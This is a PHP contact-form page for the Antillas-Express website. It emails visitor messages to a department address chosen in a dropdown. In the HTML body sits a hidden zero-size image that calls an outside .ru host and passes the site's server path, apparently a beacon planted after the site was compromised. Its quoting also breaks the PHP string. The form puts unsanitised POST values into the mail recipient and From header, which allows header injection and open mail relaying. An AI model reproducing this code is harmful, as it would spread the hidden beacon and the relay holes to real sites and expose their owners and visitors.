<?php
// @(#) $Id$
// +-----------------------------------------------------------------------+
// | Copyright (C) 2011, http://cosat.biz                                 |
// +-----------------------------------------------------------------------+
// | This file is free software; you can redistribute it and/or modify     |
// | it under the terms of the GNU General Public License as published by  |
// | the Free Software Foundation; either version 2 of the License, or     |
// | (at your option) any later version.                                   |
// | This file is distributed in the hope that it will be useful           |
// | but WITHOUT ANY WARRANTY; without even the implied warranty of        |
// | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the          |
// | GNU General Public License for more details.                          |
// +-----------------------------------------------------------------------+
// | Author: Denis Léveillé                                                          |
// +-----------------------------------------------------------------------+
//
include('lib/config.php');
$erreur= -1;	


if($_POST){

	if( $_POST['nom'] != "" && 
		 $_POST['courriel'] != "" && 
		 $_POST['dep'] != '' && 
		 $_POST['message'] != "" ) {
		
		$message="<br/>Hola, una persona utiliso la pajina contactenos del sitio $entr_url.<br/>
		".$_POST['dep']."<br/>
		Aqui esta su mensaje : 
		<br/><br/>
		Nombre : ".$_POST['nom']."
		<br/>
		E-mail : ".$_POST['courriel']."
		<br/><br/>
		mensaje : 
		<br/><br/>
		".$_POST['message']."
		<br/><br/>";
		
		$sujet="Contactenos - $entr_url - ".$_POST['dep'];
		$to=$_POST['dep'];
		$headers  = "MIME-Version: 1.0\r\n";
		$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
		$headers .= "From:  ".$_POST['nom']." <".$_POST['courriel'].">\r\n";
//		$headers .= "Reply-To: ".$param['courriel_client'];                                 // son adresse
		
		mail($to, $sujet, $message, $headers);	
		$erreur = 0;
	}
	else
		$erreur = 1;
}

echo "<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='4' cellspacing='0' align='$Enligne' border='1' >		
		<tr>
			<td>";

if( @$erreur != 0 ){
	if( $erreur == 1 )
		echo "<font color=red><b>".$txt['Tous_champs_oblig']."</b></font><br/>";
?>

<form method='post' action="">
<table width='600' align='center' cellpadding='4' width='100%' border='0'>
	<tr>
		<td align=center colspan=2 width=100%>
		<font color='#D00E29' size='3' face='verdana'><center><b><?=$txt['Contactez_nous'];?></b></font><br/><br/>		
		<b><?=$txt['Par_courriel'];?></b><br/><br/>
			<?=$txt['Choisissez_Département'];?><br/>
		<select name='dep'>
			<option value=''><?=$txt['Choisissez'];?></option>
			<option value='<?php echo hexentities($param['email_administration']);?>'>
				<?=$txt['contact_admin'];?> 
			</option>
			<option value='<?php echo hexentities($param['email_paquet']);?>'>
				<?=$txt['contact_colis'];?> 
			</option>
			<option value='<?php echo hexentities($param['email_support']);?>'>
				<?=$txt['contact_clientele'];?>     
			</option>
			<option value='<?php echo hexentities($param['email_ventes']);?>'>
				<?=$txt['contact_transfert'];?>     
			</option>
			<option value='<?php echo hexentities($param['email_ventes']);?>'>
				<?=$txt['contact_commande'];?>    
			</option>
			<option value='<?php echo hexentities($param['email_pharmacie']);?>'>
				<?=$txt['contact_pharmacie'];?>      
			</option>
			<option value='<?php echo hexentities($param['email_info']);?>'>
				<?=$txt['contact_commentaire'];?>  
			</option>
		</select>
		<br/>
		</td>
	</tr>
	<tr>
		<td valign='middle' Align='right' nowrap width='25%'>
			<?=$txt['Votre_nom'];?>
		</td>
		<td align='left'>
		<input type='txt' name='nom' size='50'>
		</td>
	</tr>
	<tr>
		<td valign='middle' Align='right' nowrap>
			<?=$txt['Votre_courriel'];?>
		</td>
		<td align=left>
			<input type='txt' name='courriel' size='50'>
		</td>
	</tr>
	<tr>
		<td align=center colspan=2>
			<?=$txt['Votre_message'];?>
			<br/>
			<textarea name='message' cols=60 rows=5></textarea>
			<br/><br/>
			<input type=submit value="<?=$txt['form_soumettre'];?>" style="width: 120; height: 22"><br/>
			<hr>
			<br/>
			<b><?=$txt['Par_telephone'];?></b><br/><br/>
			<span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br/>
			<?=$param['telephone_client'];?><br/><br/>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br/>
			<?=$param['fax_client'];?><br/>
			<br/>
			<hr>
			<br/>
			<b><?=$txt['Par_la_poste'];?></b>
			<br/><br/>
          <span class="normalTextBold">Antillas-Express</span><br/>
      	<?=$param['adresse_client'];?><br/><?=$param['ville_client'];?> 
        	<?=$param['province_client'];?>, <?=$param['pays_client'];?><br/>
        	<?=$param['codepostal_client'];?></p>
			<br/>
			<?=$txt['Horaire'];?><br/>
		</td>
	</tr>
</table>
</form>


<?
}

if( $erreur == 0 ){
?>
<table width=600 align=left cellpadding=12 width=100% border=0>
	<tr>
		<td align=left width=100%>
			<?=$txt['Merci_contacter'];?><br/><br/>
			<span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br/>
			<?=$param['telephone_client'];?><br/><br/>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br/>
			<?=$param['fax_client'];?><br/>
			<br/><br/>
		</td>
	</tr>
</table>
<?
}
?>
			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
<script language='JavaScript1.2'>
	function Rafraichie(){
				window.location.reload();
//	open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie
</script>
</body>
</html>
		